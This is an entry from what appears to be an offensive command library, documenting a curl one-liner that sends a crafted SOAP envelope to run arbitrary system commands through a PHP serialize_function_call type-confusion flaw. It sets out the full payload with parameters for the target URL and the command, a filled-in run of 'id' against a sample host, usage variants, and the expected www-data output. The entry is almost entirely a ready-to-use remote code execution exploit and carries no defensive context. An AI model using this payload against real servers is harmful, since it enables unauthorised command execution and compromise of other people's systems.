---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X POST $1 -H "Content-Type: text/xml" -d '<?xml
  version="1.0"?><soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><functionCall><name>system</name><args><arg
  xsi:type="xsd:string">$2</arg></args></functionCall></soap:Body></soap:Envelope>'
  -i
tags:
  - rce
  - exploit
  - soap
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:23:19.508Z'
verified: false
validated: true
submitted: true
---
# curl-soap-rce-payload

## Command

```bash
curl -X POST http://target.com/soap -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><functionCall><name>system</name><args><arg xsi:type="xsd:string">id</arg></args></functionCall></soap:Body></soap:Envelope>' -i
```

## Description

Sends a crafted SOAP payload to exploit type confusion in PHP's serialize_function_call, executing a system command.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL (positional $1) | Target SOAP endpoint | Yes |
| Command (positional $2) | Command to execute (e.g., id) | Yes |
| -H | Content-Type header | Yes |
| -d | Malicious XML payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST http://example.com/soap -H "Content-Type: text/xml" -d '<exploit-payload-with-id>' -i
```

### Advanced Usage

```bash
curl -X POST http://target.com/soap -H "Content-Type: text/xml" -d '<payload-with-ls>' --max-time 10
```

## Expected Output

Response including output from the executed command, e.g., 'uid=33(www-data) gid=33(www-data)'.

## Related

- [[Related Procedure: Exploit PHP SOAP Type Confusion RCE]]
